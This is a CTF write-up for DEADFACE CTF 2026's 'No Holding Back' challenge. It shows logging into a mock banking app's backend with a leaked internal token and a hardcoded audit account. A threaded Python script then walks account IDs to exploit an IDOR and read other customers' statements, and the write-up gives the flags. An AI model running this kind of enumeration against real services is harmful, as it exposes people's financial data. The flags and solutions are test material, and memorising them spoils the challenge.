---
title: No Holding Back
tags:
  - DEADFACE CTF 2026
  - OSINT
  - Mobile
---

# No Holding Back

| | |
|---|---|
| **CTF** | DEADFACE CTF 2026 |
| **Category** | OSINT (De Monne Slayer) · mobile app |
| **Points** | 210 |
| **Author** | @syyntax |
| **Writeup by** | [TheMusk3teers](../../../members.md)<br>[H0ussamCl4p](https://github.com/H0ussamCl4p) · [chaimae098](https://github.com/chaimae098) · [fatimaezzahralag-ship-it](https://github.com/fatimaezzahralag-ship-it) · [imanebouzbiba](https://github.com/imanebouzbiba) |

## Challenge

> DEADFACE was able to extract bank data from several of De Monne's customers.
> Something in the app's logic allows DEADFACE to gather details from pretty much
> any user they want. DEADFACE claims they left a flag behind as proof that they
> have access to De Monne's customer data. The problem is, we don't know who the
> user is (or their password).
>
> Submit the flag as `deadface{flag_text}`

Files given: the same `app-release.zip` as [Hard Kept Secrets](../reversing/hard-kept-secrets.md).

## Solution

Same De Monne Financial Android app as before. Two earlier challenges already gave us what we needed to talk to the backend:

- [Hard Kept Secrets](../reversing/hard-kept-secrets.md): the static `X-Internal-Token` that every copy of the app sends, `zqJRlVwBA9Xm2lE5EPjgbj/4rOxlkYZgDtkdP7jV80rZgLFrlnOEn+VAu31YKQrR`
- [Inside Man](../reversing/inside-man.md): the hardcoded audit account `audit@demonne-financial.local` / `demonnefinancial`, which really exists on the server.

### The API

`api/ApiService.java` lists every endpoint:

```java
@POST("api/auth/login")                      Call<LoginResponse> login(LoginRequest body);
@GET ("api/auth/me")                          Call<UserProfile>   getProfile();
@GET ("api/accounts")                         Call<List<Account>> getAccounts();
@GET ("api/accounts/{id}/statements")         Call<List<Statement>>   getStatements(@Path("id") int id);
@GET ("api/accounts/{id}/transactions")       Call<List<Transaction>> getTransactions(@Path("id") int id);
```

`getProfile` and `getAccounts` use the user from the JWT. The statements and transactions endpoints just take an account number in the URL. If the server doesn't check that the account is yours, that's an IDOR, and "gather details from pretty much any user" sounds like exactly that.

### Getting a token

Log in as the audit account (the base URL is in `BuildConfig.API_BASE_URL`):

```bash
curl -s -X POST http://dmf.dctf.io:8081/api/auth/login \
  -H 'X-Internal-Token: zqJRlVwBA9Xm2lE5EPjgbj/4rOxlkYZgDtkdP7jV80rZgLFrlnOEn+VAu31YKQrR' \
  -H 'Content-Type: application/json' \
  -d '{"email":"audit@demonne-financial.local","password":"demonnefinancial"}'
```

We got back a JWT for `user_id: 5`. The audit user has no accounts, so `GET /api/accounts` is `[]`, but that doesn't matter if the IDOR works.

### Walking the account IDs

Every request needs both `X-Internal-Token` and `Authorization: Bearer <token>`. The catch is that IDs 1 to 1000 are all empty. The real accounts start at 1001. A threaded loop gets through them quickly:

```python
import urllib.request, json
from concurrent.futures import ThreadPoolExecutor

B = "http://dmf.dctf.io:8081"
T = "zqJRlVwBA9Xm2lE5EPjgbj/4rOxlkYZgDtkdP7jV80rZgLFrlnOEn+VAu31YKQrR"

r = urllib.request.Request(
    B + "/api/auth/login",
    data=json.dumps({"email": "audit@demonne-financial.local",
                     "password": "demonnefinancial"}).encode(),
    headers={"X-Internal-Token": T, "Content-Type": "application/json"})
tok = json.loads(urllib.request.urlopen(r).read())["token"]
H = {"X-Internal-Token": T, "Authorization": "Bearer " + tok}

def check(i):
    out = []
    for e in ("statements", "transactions"):
        try:
            resp = urllib.request.urlopen(
                urllib.request.Request(f"{B}/api/accounts/{i}/{e}", headers=H), timeout=8)
            body = resp.read().decode()
            if body.strip() != "[]":
                out.append((i, e, body))
        except Exception:
            pass
    return out

with ThreadPoolExecutor(max_workers=50) as ex:
    for res in ex.map(check, range(1, 1501)):
        for i, e, body in res:
            print(i, e, body[:300])
```

Accounts 1001, 1002, 1003 and 1006 are normal customers (groceries, payroll, mortgage). Account 1007 is the one DEADFACE left for us:

```json
[{"account_id":1007,"id":4,
  "period":"Q1 2026 Internal Audit Summary",
  "reference":"AUD-2026-Q1-99001",
  "summary":"RESTRICTED — De Monne Financial Internal Audit Division | Ref: deadface{IDOR_u_2_f1nD_m0r3_Fl4gz} | All ledger entries verified and reconciled. No discrepancies found."}]
```

## Flag

!!! flag "Flag"
    `deadface{IDOR_u_2_f1nD_m0r3_Fl4gz}`

## Red herrings

The APK has other `deadface{...}` strings, but they're for other challenges:

- `deadface{zqJRlVwBA9Xm2lE5EPjgbj/4rOxlkYZgDtkdP7jV80rZgLFrlnOEn+VAu31YKQrR}`: [Hard Kept Secrets](../reversing/hard-kept-secrets.md)
- `deadface{l3FT_b3Hind!}`: the audit user's `message`, [Inside Man](../reversing/inside-man.md)
- `deadface{flaG_ManIfesT3d}`: the exported `DiagnosticActivity`
- `deadface{Ur_N0t_A110wEd_h3r3}`: `SecureVaultActivity`, behind a root/emulator check

## Takeaways

The backdoor login only got us a session. The actual bug is that the account endpoints never check who owns the account. When you see `/resource/{id}`, try IDs that aren't yours, and don't assume they start at 1.
